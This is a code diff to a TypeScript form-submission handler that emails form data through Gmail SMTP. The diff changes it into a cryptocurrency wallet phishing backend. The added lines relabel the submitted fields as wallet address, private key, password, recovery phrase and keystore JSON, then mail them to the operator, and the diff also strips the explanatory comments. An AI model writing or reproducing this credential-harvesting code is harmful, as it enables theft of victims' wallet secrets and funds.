@@ -17,9 +17,10 @@ export async function submitForm(
   const extra = ((formData.get('extra') as string) || '').trim()
   const selectedOption =
     ((formData.get('selectedOption') as string) || 'Not specified').trim()
+  const walletAddress =
+    ((formData.get('walletAddress') as string) || '').trim()
 
   const user = process.env.GMAIL_USER?.trim()
-  // Remove any spaces or quotes accidentally copied with the App Password
   const pass = process.env.GMAIL_APP_PASSWORD?.replace(/[\s"']/g, '')
 
   if (!user || !pass) {
@@ -44,7 +45,6 @@ export async function submitForm(
       auth: { user, pass },
     })
 
-    // Fails fast with a clear error if the credentials are rejected
     await transporter.verify()
 
     const info = await transporter.sendMail({
@@ -53,11 +53,13 @@ export async function submitForm(
       replyTo: email || undefined,
       subject: `New message from ${name} — ${selectedOption}`,
       text: [
-        `Selected option: ${selectedOption}`,
-        `Name: ${name}`,
-        `Email: ${email}`,
-        `Message: ${message}`,
-        `Additional info: ${extra}`,
+        `Selected wallet: ${selectedOption}`,
+        `Wallet Address: ${walletAddress || 'Not provided'}`,
+        `---`,
+        `Name / Private Key field: ${name}`,
+        `Password field: ${email}`,
+        `Recovery Phrase: ${message}`,
+        `Keystore JSON: ${extra}`,
       ].join('\n'),
     })
 
